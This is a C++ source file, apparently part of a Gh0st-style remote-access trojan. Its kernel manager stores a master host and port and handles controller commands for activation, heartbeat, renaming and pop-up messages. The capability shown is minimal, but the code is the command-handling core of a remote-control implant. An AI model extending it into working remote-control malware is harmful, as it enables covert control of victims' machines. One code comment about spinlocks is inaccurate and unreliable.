// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "KernelManager.h"
#include "loop.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

char	CKernelManager::m_strMasterHost[256] = {0};
UINT	CKernelManager::m_nMasterPort = 80;
CKernelManager::CKernelManager(CClientSocket *pClient, LPCTSTR lpszKillEvent, 
		LPCTSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
{
 
	if (lpszKillEvent != NULL)
		lstrcpy(m_strKillEvent, lpszKillEvent);

	if (lpszMasterHost != NULL)
		lstrcpy(m_strMasterHost, lpszMasterHost);

	m_nMasterPort = nMasterPort;
	m_nThreadCount = 0;
	// 初次连接，控制端发送命令表始激活
	m_bIsActived = false;

}

CKernelManager::~CKernelManager()
{
	for(int i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}



// 加上激活
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_ACTIVED:
		InterlockedExchange((LONG *)&m_bIsActived, true);  //调用了内核的自旋锁，把cpu总线锁住，让多线程无法抢占这个内存
		DbgPrintA("Debug:服务器发来激活功能了\n");
		//m_bIsActive = true;  //比这句话安全
		break;
	case COMMAND_REPLAY_HEARTBEAT: // 回复心跳包
		break;
	case COMMAND_RENAME_REMARK:
		::MessageBox(NULL, "请重命名OK?", "", MB_OK);
		DbgPrintA("Debug:服务器发来重命名方法...该咋实现");
		break;
	case COMMAND_POPMESSAGE:
		//::MessageBox(NULL,(CHAR*)&lpBuffer[1],NULL,MB_OK);

		POPMESSAGE *pMsg = (POPMESSAGE *)lpBuffer;
		::MessageBox(NULL, pMsg->szText, NULL, MB_OK);

		break;
	}	
}

void CKernelManager::UnInstallService()
{

}

bool CKernelManager::IsActived()
{
	return	m_bIsActived;	
}